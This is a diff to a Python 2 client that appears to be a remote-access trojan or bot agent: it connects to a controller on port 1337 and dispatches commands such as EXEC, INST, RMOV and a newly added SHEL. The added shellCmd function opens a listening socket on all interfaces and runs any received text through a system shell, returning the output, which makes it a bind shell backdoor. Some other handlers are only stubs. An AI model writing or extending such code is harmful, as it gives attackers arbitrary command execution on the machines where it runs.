@@ -4,17 +4,20 @@ import sys
 import socket
 import os.path
 
+
 def runCmd(args):
     s = args["socket"]
     cmd = args["args"]
     print "running command:", cmd
     s.send('OK')
 
+
 def installCmd(args):
     s = args["socket"]
     cmd = args["args"]
     print "installing:", cmd
     s.send('OK')
+
 
 def fileCmd(args):
     print "print in file transfer"
@@ -25,7 +28,6 @@ def fileCmd(args):
     bufferSize = 1024
     fileRecv = open(dest, 'wb')
     tmpSize = 0
-
 
     while True:
 
@@ -58,12 +60,35 @@ def removeCmd(args):
     print "removing:", cmd
     s.send('OK')
 
-def netcatCmd(args):
-    print "netcat", args
+
+def shellCmd(args):
+    # TODO: improve shell this one sucks
+
+    s = args["socket"]
+    port = int(args["args"])
+    shellSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    shellSocket.bind(('0.0.0.0', int(port)))
+    shellSocket.listen(1)
+    conn, addr = shellSocket.accept()
+
+    while True:
+        cmd = conn.recv(1024)
+
+        if cmd:
+            ps = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+
+            if ps:
+                out = str(ps.stdout.read())
+                conn.send(out)
+
+            else:
+                err = str(ps.stderr.read())
+                conn.send(err)
 
 def falseCmd(args):
     cmd = args["args"]
-    print "Invalid command, args:", args
+    print "Invalid command, args:", cmd
+
 
 def client(host, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -73,7 +98,7 @@ def client(host, port):
         print "Cannot connect"
         sys.exit()
 
-# main loop:
+    # main loop:
 
     while True:
         data = s.recv(1024)
@@ -93,24 +118,24 @@ def client(host, port):
 
         else:
 
+            print data
             prefix = data.split()[0]
             args = {"args": data.split('"')[1], "socket": s}
-
 
             case = {
                 "EXEC": runCmd,
                 "INST": installCmd,
                 "RMOV": removeCmd,
-                "NCAT": netcatCmd
+                "SHEL": shellCmd
             }
 
             if prefix in case:
-
                 invoke = case.get(prefix, falseCmd)
                 invoke(args)
 
-def main ():
 
+def main():
     client('127.0.0.1', 1337)
+
 
 main()
